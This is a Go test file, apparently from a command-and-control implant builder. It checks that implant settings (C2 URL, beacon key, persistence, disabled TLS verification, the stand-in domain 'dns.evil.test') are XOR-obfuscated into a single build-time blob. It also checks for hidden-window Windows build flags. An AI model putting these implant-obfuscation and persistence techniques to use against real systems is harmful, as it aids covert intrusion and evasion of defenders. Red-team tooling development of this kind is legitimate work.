package payload

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"testing"
)

// decodeBlobForTest mirrors the agent's mustDecrypt format so we can validate
// the server-produced blob round-trips to valid JSON.
func decodeBlobForTest(obfuscated string) ([]byte, bool) {
	var idx int
	for i := 0; i < len(obfuscated); i++ {
		if obfuscated[i] == ':' {
			idx = i
			break
		}
	}
	if idx == 0 {
		return nil, false
	}
	key, err := hex.DecodeString(obfuscated[:idx])
	if err != nil {
		return nil, false
	}
	data, err := base64.StdEncoding.DecodeString(obfuscated[idx+1:])
	if err != nil || len(key) != len(data) {
		return nil, false
	}
	out := make([]byte, len(data))
	for i := range data {
		out[i] = data[i] ^ key[i]
	}
	return out, true
}

func TestBuildConfigBlobRoundTrip(t *testing.T) {
	profile := defaultMalleableProfile()
	cfg := ImplantConfig{
		C2URL:         "http://10.0.0.9:9999",
		Protocol:      "http",
		Interval:      33,
		Jitter:        15,
		UserAgent:     "UA/1.0",
		Persist:       true,
		SkipTLSVerify: true,
		BeaconKey:     "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899",
		ListenerID:    4,
		DNSDomain:     "dns.evil.test",
	}

	blob := buildConfigBlob(cfg, profile)
	if blob == "" {
		t.Fatal("buildConfigBlob returned empty")
	}

	raw, ok := decodeBlobForTest(blob)
	if !ok {
		t.Fatal("blob did not decode in the agent's xor format")
	}
	var got agentConfigJSON
	if err := json.Unmarshal(raw, &got); err != nil {
		t.Fatalf("decoded blob is not valid JSON: %v", err)
	}

	if got.C2URL != cfg.C2URL {
		t.Errorf("C2URL mismatch: got %q want %q", got.C2URL, cfg.C2URL)
	}
	if got.Interval != "33" {
		t.Errorf("Interval mismatch: got %q want %q", got.Interval, "33")
	}
	if got.Jitter != "15" {
		t.Errorf("Jitter mismatch: got %q want %q", got.Jitter, "15")
	}
	if got.BeaconKey != cfg.BeaconKey {
		t.Errorf("BeaconKey mismatch")
	}
	if got.Persist != "true" {
		t.Errorf("Persist mismatch: got %q", got.Persist)
	}
	if got.SkipTLSVerify != "true" {
		t.Errorf("SkipTLSVerify mismatch: got %q", got.SkipTLSVerify)
	}
	if got.DNSDomain != cfg.DNSDomain {
		t.Errorf("DNSDomain mismatch")
	}
	// The obfuscated blob must not leak plaintext config values.
	for _, leaked := range []string{cfg.BeaconKey, cfg.DNSDomain} {
		if containsString(blob, leaked) {
			t.Errorf("blob leaks plaintext %q", leaked)
		}
	}
}

func containsString(haystack, needle string) bool {
	return len(haystack) > 0 && len(needle) > 0 && indexOf(haystack, needle) >= 0
}

func indexOf(s, sub string) int {
	n := len(s)
	m := len(sub)
	for i := 0; i+m <= n; i++ {
		if s[i:i+m] == sub {
			return i
		}
	}
	return -1
}

func TestBuildLdflagsUsesSingleConfigBlob(t *testing.T) {
	profile := defaultMalleableProfile()
	profile.BeaconURI = "/api/v1/beacon"
	cfg := ImplantConfig{
		C2URL:     "http://10.1.1.5:8080",
		Protocol:  "http",
		Interval:  10,
		Jitter:    20,
		BeaconKey: "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899",
	}

	ldflags := buildLdflags(cfg, profile, "windows")

	if !containsString(ldflags, `-X "main.ConfigBlob=`) {
		t.Fatalf("ldflags missing ConfigBlob injection: %s", ldflags)
	}
	// No more per-field ldflags for config values.
	for _, old := range []string{"main.C2URL=", "main.BeaconKeyStr=", "main.IntervalStr=", "main.SSHHostKeyStr="} {
		if containsString(ldflags, old) {
			t.Errorf("legacy ldflags injection %q still present in %s", old, ldflags)
		}
	}
	// Windows GUI flag preserved.
	if !containsString(ldflags, "-H=windowsgui") {
		t.Errorf("windowsgui flag missing: %s", ldflags)
	}
	// Linux must NOT include windowsgui.
	ldflagsLinux := buildLdflags(cfg, profile, "linux")
	if containsString(ldflagsLinux, "-H=windowsgui") {
		t.Errorf("linux build should not include -H=windowsgui")
	}
	if !containsString(ldflags, "-buildid=") {
		t.Errorf("buildid flag missing")
	}
}
